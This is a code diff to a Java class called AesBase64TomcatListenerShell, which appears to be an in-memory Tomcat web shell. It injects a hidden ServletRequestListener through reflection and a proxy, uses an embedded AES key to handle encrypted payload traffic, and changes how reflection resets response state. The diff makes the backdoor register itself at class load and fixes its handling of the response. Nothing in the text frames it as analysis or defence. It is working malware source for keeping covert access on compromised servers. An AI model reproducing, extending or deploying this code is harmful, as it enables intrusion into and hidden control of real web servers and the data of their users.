@@ -5,8 +5,6 @@ import java.lang.reflect.*;
 import java.util.*;
 
 public class AesBase64TomcatListenerShell extends ClassLoader implements InvocationHandler {
-    private static boolean initialized = false;
-    private static final Object lock = new Object();
     private static Class payloadClass;
     private static Object unsafe;
     private String key = "3c6e0b8a9c15224a";
@@ -14,7 +12,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
 
 
     static {
-        new AesBase64TomcatListenerShell();
+        new AesBase64TomcatListenerShell().addListener();
     }
 
     public AesBase64TomcatListenerShell(ClassLoader loader) {
@@ -22,27 +20,26 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     }
 
     public AesBase64TomcatListenerShell() {
-        synchronized (lock) {
-            if (!initialized) {
-                initialized = true;
-                try {
-                    Class servletRequestListenerClass = null;
-                    try {
-                        servletRequestListenerClass = loadClasses("jakarta.servlet.ServletRequestListener");
-                    } catch (Exception e) {
-                        try {
-                            servletRequestListenerClass = loadClasses("javax.servlet.ServletRequestListener");
-                        } catch (ClassNotFoundException ex) {
 
-                        }
-                    }
-                    if (servletRequestListenerClass != null) {
-                        addListener(Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, this));
-                    }
-                } catch (Throwable e) {
+    }
+
+    private void addListener() {
+        try {
+            Class servletRequestListenerClass = null;
+            try {
+                servletRequestListenerClass = loadClasses("jakarta.servlet.ServletRequestListener");
+            } catch (Exception e) {
+                try {
+                    servletRequestListenerClass = loadClasses("javax.servlet.ServletRequestListener");
+                } catch (ClassNotFoundException ex) {
 
                 }
             }
+            if (servletRequestListenerClass != null) {
+                addListener(java.lang.reflect.Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletRequestListenerClass}, this));
+            }
+        } catch (Throwable e) {
+
         }
     }
 
@@ -518,7 +515,8 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                                     printWriter.close();
                                     setFieldValue(response, "usingWriter", Boolean.FALSE);
                                     setFieldValue(response, "usingOutputStream", Boolean.FALSE);
-                                    setFieldValue(response, "committed", Boolean.FALSE);
+                                    setFieldValue(response, "appCommitted", Boolean.FALSE);
+                                    setFieldValue(getFieldValue(response, "coyoteResponse"), "committed", Boolean.FALSE);
                                 }
                             }
                         }
